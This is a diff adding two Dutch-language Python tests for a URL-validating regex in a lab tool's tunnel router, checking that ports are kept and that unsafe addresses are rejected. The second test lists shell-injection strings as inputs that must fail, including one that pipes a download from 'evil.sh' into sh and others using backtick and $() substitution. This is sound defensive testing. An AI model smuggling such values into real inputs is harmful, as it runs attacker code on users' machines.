@@ -191,3 +191,24 @@ def test_de_lijst_parser_maakt_regels_van_echte_labs():
     assert uit.returncode == 0, uit.stderr
     assert uit.stdout.startswith("1\tlab-1\tHive · feature (feature/x) - draait")
     assert "poorten 5173, 7071" in uit.stdout
+
+
+def test_het_adres_van_het_scherm_wint_van_de_headers():
+    """Tussen je browser en de backend zitten twee proxies, en die lieten de
+    poort uit `Host` vallen: de helper kreeg `http://192.168.2.15` terwijl
+    LabX op 8443 luistert. Je browser weet het wel."""
+    from routers.tunnel_router import _BASIS
+
+    assert _BASIS.match("https://192.168.2.15:8443")
+    assert _BASIS.match("http://labx.thuis")
+    assert not _BASIS.match("http://192.168.2.15:8443/"), "slash eraf vóór de controle"
+
+
+def test_een_adres_met_shell_erin_komt_er_niet_door():
+    """Deze tekst belandt in een shell-variabele op JOUW machine."""
+    from routers.tunnel_router import _BASIS
+
+    for kwaad in ('https://x";curl evil.sh|sh;#',
+                  "https://x`whoami`", "https://x$(id)", "https://x y",
+                  "ftp://x", "javascript:alert(1)"):
+        assert not _BASIS.match(kwaad), kwaad
